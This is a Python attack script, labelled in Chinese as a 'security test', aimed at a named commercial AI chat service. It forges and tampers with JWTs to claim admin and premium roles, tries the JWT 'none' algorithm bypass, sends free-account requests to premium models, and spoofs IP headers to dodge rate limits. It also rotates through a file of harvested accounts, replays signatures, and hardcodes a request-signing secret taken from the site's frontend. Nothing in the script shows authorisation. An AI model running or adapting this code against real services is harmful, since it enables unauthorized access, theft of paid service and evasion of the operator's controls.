import requests
import json
import hashlib
import hmac
import uuid
import time
import random
import base64
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

import os
os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
os.environ.pop('http_proxy', None)
os.environ.pop('https_proxy', None)

proxies = {"http": None, "https": None}

API_BASE = "https://api.877ai.cn/api"
SIGN_SECRET = "ukj3OXO_crBZoBmMeYDUw_gLqL9BqgbgY27XXPzJqTiWf1cToYLAPtPQRfpzypBa"


def generate_signature(method, url, body, timestamp, nonce):
    path = urlparse(url).path if url.startswith("http") else url
    body_sha256 = hashlib.sha256(body.encode() if body else b"").hexdigest()
    sign_string = f"{method.upper()}\n{path}\n{timestamp}\n{nonce}\n{body_sha256}"
    return hmac.new(SIGN_SECRET.encode(), sign_string.encode(), hashlib.sha256).hexdigest()


def make_headers(method, url, body="", token=None, skip_auth=False, skip_sign=False):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Origin": "https://kulaai.cn",
        "Referer": "https://kulaai.cn/",
        "Content-Type": "application/json",
    }
    if not skip_sign:
        timestamp = str(int(time.time() * 1000))
        nonce = str(uuid.uuid4())
        headers["X-Timestamp"] = timestamp
        headers["X-Nonce"] = nonce
        headers["X-Signature"] = generate_signature(method, url, body, timestamp, nonce)
    if token and not skip_auth:
        headers["Authorization"] = f"Bearer {token}"
    return headers


# 加载账号
with open(r"e:\BaiduNetdiskDownload\1\kulaai_accounts.json", "r", encoding="utf-8") as f:
    accounts = json.load(f)

token = accounts[0]["token"]
free_token = accounts[0]["token"]

print("=" * 70)
print("KULA AI 安全测试 - 绕过限制分析")
print("=" * 70)

# ============================================================
# 测试1: 无认证访问
# ============================================================
print("\n" + "=" * 70)
print("[测试1] 无认证访问API（不带Token）")
print("=" * 70)

url = f"{API_BASE}/chat/stream"
body = json.dumps({
    "model": "chatgpt",
    "displayModelId": "c4bfbb2b-62c4-417f-9fe3-ea0b52f441ab",
    "messages": [{"role": "user", "content": "hi"}],
    "stream": True
})

# 1a: 有签名但无Token
print("\n  [1a] 有签名 + 无Token:")
headers = make_headers("POST", url, body, skip_auth=True)
r = requests.post(url, data=body, headers=headers, timeout=15, proxies=proxies, verify=False)
print(f"    状态码: {r.status_code}")
print(f"    响应: {r.text[:200]}")

# 1b: 无签名无Token
print("\n  [1b] 无签名 + 无Token:")
headers = make_headers("POST", url, body, skip_auth=True, skip_sign=True)
r = requests.post(url, data=body, headers=headers, timeout=15, proxies=proxies, verify=False)
print(f"    状态码: {r.status_code}")
print(f"    响应: {r.text[:200]}")

# 1c: 无签名有Token
print("\n  [1c] 无签名 + 有Token:")
headers = make_headers("POST", url, body, token=token, skip_sign=True)
r = requests.post(url, data=body, headers=headers, timeout=15, proxies=proxies, verify=False)
print(f"    状态码: {r.status_code}")
print(f"    响应: {r.text[:200]}")

# 1d: 伪造Token
print("\n  [1d] 伪造Token:")
fake_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJmYWtlLXVzZXItaWQiLCJlbWFpbCI6ImFkbWluQGt1bGFhaS5jbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4Mjg4Mjk2MSwiZXhwIjoxNzgzNDg3NzYxfQ.fake_signature_here"
headers = make_headers("POST", url, body, token=fake_token)
r = requests.post(url, data=body, headers=headers, timeout=15, proxies=proxies, verify=False)
print(f"    状态码: {r.status_code}")
print(f"    响应: {r.text[:200]}")

# 1e: 篡改Token中的role为admin
print("\n  [1e] 篡改JWT Payload (role->admin):")
parts = token.split(".")
header_b64 = parts[0]
payload_b64 = parts[1]
# 补全padding
payload_padded = payload_b64 + "=" * (4 - len(payload_b64) % 4)
payload_json = json.loads(base64.b64decode(payload_padded))
print(f"    原始Payload: {json.dumps(payload_json)}")

# 篡改role
payload_json["role"] = "admin"
payload_json["plan"] = "premium"
payload_json["tier"] = "premium"
tampered_payload = base64.b64encode(json.dumps(payload_json).encode()).decode().rstrip("=")
tampered_token = f"{header_b64}.{tampered_payload}.{'a' * 43}"
headers = make_headers("POST", url, body, token=tampered_token)
r = requests.post(url, data=body, headers=headers, timeout=15, proxies=proxies, verify=False)
print(f"    状态码: {r.status_code}")
print(f"    响应: {r.text[:200]}")

# ============================================================
# 测试2: 免费账号访问高级模型
# ============================================================
print("\n" + "=" * 70)
print("[测试2] 免费账号访问高级(premium)模型")
print("=" * 70)

# 获取所有模型
models_url = f"{API_BASE}/chat/display-models?capability=chat"
headers = make_headers("GET", models_url, "", token=token)
r = requests.get(models_url, headers=headers, timeout=15, proxies=proxies, verify=False)
all_models = r.json()

premium_models = [m for m in all_models if m.get('tier') == 'premium']
free_models = [m for m in all_models if m.get('tier') == 'free']
print(f"\n  总模型数: {len(all_models)}")
print(f"  Premium模型: {len(premium_models)}")
print(f"  Free模型: {len(free_models)}")

# 测试访问premium模型
print(f"\n  测试免费账号访问Premium模型:")
test_premium = premium_models[:5] if premium_models else []
for m in test_premium:
    print(f"\n  模型: {m['name']} (tier={m['tier']})")
    body = json.dumps({
        "model": m.get('brand', 'chatgpt'),
        "displayModelId": m['id'],
        "messages": [{"role": "user", "content": "hi"}],
        "stream": True
    })
    headers = make_headers("POST", url, body, token=free_token)
    r = requests.post(url, data=body, headers=headers, timeout=30, stream=True, proxies=proxies, verify=False)
    
    full_text = ""
    error_msg = ""
    for line in r.iter_lines():
        if line:
            line_str = line.decode('utf-8', errors='ignore')
            if line_str.startswith('data: '):
                data = line_str[6:]
                if data == '[DONE]':
                    break
                try:
                    j = json.loads(data)
                    if j.get('done'):
                        break
                    if j.get('error'):
                        error_msg = j['error']
                        break
                    if 'content' in j and j['content']:
                        full_text += j['content']
                except:
                    pass
    
    if error_msg:
        print(f"    ❌ 被拒绝: {error_msg}")
    elif full_text:
        print(f"    ✅ 成功! 回复: {full_text[:80]}")
    elif r.status_code == 200 and not full_text and not error_msg:
        # 尝试读取完整响应
        try:
            r2 = requests.post(url, data=body, headers=headers, timeout=30, proxies=proxies, verify=False)
            print(f"    ⚠️ 状态码=200, 响应: {r2.text[:200]}")
        except:
            print(f"    ⚠️ 状态码=200, 无流式内容")
    else:
        print(f"    ⚠️ 状态码={r.status_code}, 无内容")

# ============================================================
# 测试3: 速率限制绕过
# ============================================================
print("\n" + "=" * 70)
print("[测试3] 速率限制绕过测试")
print("=" * 70)

# 3a: 快速发送请求测试限制
print("\n  [3a] 快速请求测试（同一账号）:")
quota_url = f"{API_BASE}/subscription/quota"
for i in range(3):
    headers = make_headers("GET", quota_url, "", token=token)
    r = requests.get(quota_url, headers=headers, timeout=10, proxies=proxies, verify=False)
    limit = r.headers.get('X-RateLimit-Limit', 'N/A')
    remaining = r.headers.get('X-RateLimit-Remaining', 'N/A')
    reset = r.headers.get('X-RateLimit-Reset', 'N/A')
    print(f"    请求{i+1}: {remaining}/{limit}, 重置{reset}s")

# 3b: 不同IP头测试
print("\n  [3b] 伪造X-Forwarded-For绕过速率限制:")
for i in range(3):
    fake_ip = f"192.168.{random.randint(1,255)}.{random.randint(1,255)}"
    headers = make_headers("GET", quota_url, "", token=token)
    headers["X-Forwarded-For"] = fake_ip
    headers["X-Real-IP"] = fake_ip
    headers["CF-Connecting-IP"] = fake_ip
    r = requests.get(quota_url, headers=headers, timeout=10, proxies=proxies, verify=False)
    limit = r.headers.get('X-RateLimit-Limit', 'N/A')
    remaining = r.headers.get('X-RateLimit-Remaining', 'N/A')
    print(f"    IP={fake_ip}: {remaining}/{limit}")

# 3c: 多账号轮询
print("\n  [3c] 多账号轮询:")
for i, acc in enumerate(accounts):
    headers = make_headers("GET", quota_url, "", token=acc["token"])
    r = requests.get(quota_url, headers=headers, timeout=10, proxies=proxies, verify=False)
    limit = r.headers.get('X-RateLimit-Limit', 'N/A')
    remaining = r.headers.get('X-RateLimit-Remaining', 'N/A')
    print(f"    账号{i}: {remaining}/{limit}")

# ============================================================
# 测试4: 签名安全分析
# ============================================================
print("\n" + "=" * 70)
print("[测试4] 签名安全分析")
print("=" * 70)

# 4a: 签名重放测试
print("\n  [4a] 签名重放测试（使用过期签名）:")
timestamp = "1782883022520"  # 旧时间戳
nonce = "28d27402-7f1a-4120-ad0c-7f74f077e3f6"  # 旧nonce
body_str = '{"model":"chatgpt","displayModelId":"c4bfbb2b-62c4-417f-9fe3-ea0b52f441ab","messages":[{"role":"user","content":"hi"}],"stream":true}'
body_sha256 = hashlib.sha256(body_str.encode()).hexdigest()
sign_string = f"POST\n/api/chat/stream\n{timestamp}\n{nonce}\n{body_sha256}"
old_sig = hmac.new(SIGN_SECRET.encode(), sign_string.encode(), hashlib.sha256).hexdigest()

headers = {
    "User-Agent": "Mozilla/5.0",
    "Origin": "https://kulaai.cn",
    "Referer": "https://kulaai.cn/",
    "Content-Type": "application/json",
    "Authorization": f"Bearer {token}",
    "X-Timestamp": timestamp,
    "X-Nonce": nonce,
    "X-Signature": old_sig,
}
r = requests.post(url, data=body_str, headers=headers, timeout=15, proxies=proxies, verify=False)
print(f"    状态码: {r.status_code}")
print(f"    响应: {r.text[:200]}")

# 4b: 签名密钥泄露分析
print("\n  [4b] 签名密钥泄露分析:")
print(f"    密钥: {SIGN_SECRET}")
print(f"    密钥长度: {len(SIGN_SECRET)} 字符")
print(f"    密钥位置: 前端JS文件 (api-B0xuzE-o.js)")
print(f"    风险: 任何人都可以伪造有效签名")

# 4c: 无签名但有Token
print("\n  [4c] Token有效但签名篡改:")
headers = make_headers("POST", url, body_str, token=token)
headers["X-Signature"] = "a" * 64  # 篡改签名
r = requests.post(url, data=body_str, headers=headers, timeout=15, proxies=proxies, verify=False)
print(f"    状态码: {r.status_code}")
print(f"    响应: {r.text[:200]}")

# ============================================================
# 测试5: 其他API端点无认证访问
# ============================================================
print("\n" + "=" * 70)
print("[测试5] 其他API端点安全测试")
print("=" * 70)

endpoints = [
    ("GET", "/chat/display-models", "模型列表"),
    ("GET", "/chat/nav-categories", "导航分类"),
    ("GET", "/subscription/plans", "订阅计划"),
    ("GET", "/payment/methods", "支付方式"),
    ("GET", "/chat/qrcode", "二维码配置"),
    ("GET", "/chat/news?limit=5", "新闻列表"),
    ("GET", "/ads/active", "广告列表"),
    ("GET", "/auth/site-config", "站点配置"),
    ("GET", "/chat/display-models?capability=chat", "聊天模型"),
    ("GET", "/chat/display-models?capability=image", "图片模型"),
    ("GET", "/chat/display-models?capability=video", "视频模型"),
]

for method, path, desc in endpoints:
    full_url = f"{API_BASE}{path}"
    headers = make_headers(method, full_url, "", skip_auth=True)
    try:
        if method == "GET":
            r = requests.get(full_url, headers=headers, timeout=10, proxies=proxies, verify=False)
        else:
            r = requests.post(full_url, headers=headers, timeout=10, proxies=proxies, verify=False)
        
        status = "✅ 可访问" if r.status_code == 200 else f"❌ [{r.status_code}]"
        data_len = len(r.text)
        print(f"  {status} {desc}: {path} ({data_len} bytes)")
    except Exception as e:
        print(f"  ❌ {desc}: {path} - {e}")

# ============================================================
# 测试6: JWT Token安全分析
# ============================================================
print("\n" + "=" * 70)
print("[测试6] JWT Token安全分析")
print("=" * 70)

parts = token.split(".")
header_padded = parts[0] + "=" * (4 - len(parts[0]) % 4)
payload_padded = parts[1] + "=" * (4 - len(parts[1]) % 4)
jwt_header = json.loads(base64.b64decode(header_padded))
jwt_payload = json.loads(base64.b64decode(payload_padded))

print(f"  JWT Header: {json.dumps(jwt_header, indent=2)}")
print(f"  JWT Payload: {json.dumps(jwt_payload, indent=2)}")
print(f"  签名算法: {jwt_header.get('alg')}")
print(f"  Token有效期: {(jwt_payload.get('exp', 0) - jwt_payload.get('iat', 0)) / 86400:.1f} 天")
print(f"  过期时间: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(jwt_payload.get('exp', 0)))}")

# 检查是否有none算法绕过
print("\n  [6a] JWT none算法绕过测试:")
none_header = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
none_token = f"{none_header}.{parts[1]}."
headers = make_headers("POST", url, body_str, token=none_token)
r = requests.post(url, data=body_str, headers=headers, timeout=15, proxies=proxies, verify=False)
print(f"    状态码: {r.status_code}")
print(f"    响应: {r.text[:200]}")
